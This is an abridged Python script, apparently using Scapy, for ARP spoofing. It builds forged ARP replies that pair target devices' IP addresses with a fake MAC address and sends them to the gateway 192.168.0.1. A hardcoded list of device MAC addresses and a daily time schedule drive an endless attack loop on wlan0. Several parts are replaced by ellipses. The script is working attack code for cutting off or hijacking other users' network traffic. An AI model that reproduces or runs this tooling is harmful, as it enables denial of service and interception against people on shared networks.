...
def GeneratePacket_1(PackNum,TargtMAC):
    ...
    for targtmac in TargtMAC:
        ...
        if targtIP is not None:
            ...
            PKT.append(PKT_)
            PKT_ = Ether(dst=GW_mac)/ARP(op=2,psrc=targtIP,hwsrc=Temp_mac,pdst=GW_ip,hwdst=GW_mac)
            PKT.append(PKT_)
    return PKT
...
if __name__ == "__main__":
    ...
    #6:00~8:30
    #17:30~23:59
    ScheduleTable=[0,0,2,30,6,30,17,10,17,13,23,59]
    #ScheduleTable=[0,0,23,59]
    TargetMac = ["04:e6:76:46:a6:f3",\
                        "78:02:f8:34:4d:b5",\
                        "e8:b4:c8:7b:f3:0f",\
                        "20:47:47:ba:99:1e",\
                        "c8:25:e1:92:f6:38",\
    ...
    while True:
        ...
        Attack_MAC("wlan0","192.168.0.1",TargetMac,1,random.randrange(4000,5500),0.001)
